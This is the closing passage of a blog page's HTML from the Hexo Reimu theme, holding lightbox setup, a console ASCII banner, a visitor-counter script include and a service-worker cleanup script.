        }
        if(window.lightboxStatus === 'ready') {
          pswp()
        } else {
          window.addEventListener('lightbox:ready', pswp);
        }
      </script>
      








    
  </div>
</div>


  <script>
    console.log(String.raw`%c 
 ______     ______     __     __    __     __  __    
/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
 \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                  
`,'color: #ff5252;')
    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
  </script>
  



  
<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>




<script>
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.getRegistrations().then((registrations) => {
      for (let registration of registrations) {
        registration.unregister();
      }
    });
  }
</script>







  </body>
  </html>

